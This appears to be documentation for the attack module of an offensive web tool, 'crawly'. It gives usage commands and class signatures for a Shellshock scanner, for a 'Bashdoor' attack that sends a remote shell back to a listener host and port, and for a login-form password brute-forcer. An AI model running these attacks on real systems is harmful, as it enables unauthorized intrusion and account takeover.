# Attack

# File

- [x] attack.py

This file contains attacking classes of crawly. Each class instancied is auto runned with the gived paremeters.

# Shellshock / Bashdoor

```
# CLI command
crawly -A http://www.test.com/cgi-bin/vuln.cgi --shellshock
crawly -A http://www.test.com/cgi-bin/vuln.cgi --bashdoor --lhost 192.168.1.2 --lport 4444
```
```python
class Shellshock:
    def __init__(self, URL)

class Bashdoor:
    def __init__(self, RURL, LHOST, LPORT)
    
>>> import crawly
>>> URL = "http://www.test.com/cgi-bin/vuln.cgi"
>>> crawly.Shellshock(URL)
>>> crawly.Bashdoor(URL, "192.168.1.2", 4444)
```

# HTML form bruteforcer
```
Can break simple HTML forms.

```python
class HTMLBrute:
	def __init__(self, URL, USERFIELD="username", PASSFIELD="password", ERRORMSG="Error", 
		USER="admin", WORDLIST, THREADS)

>>> import crawly
>>> crawly.HTMLBrute("http://test.com/admin.php", ERRORMSG="Login Error", USER="webmaster", WORDLIST="pass_list.lst", THREADS=35)
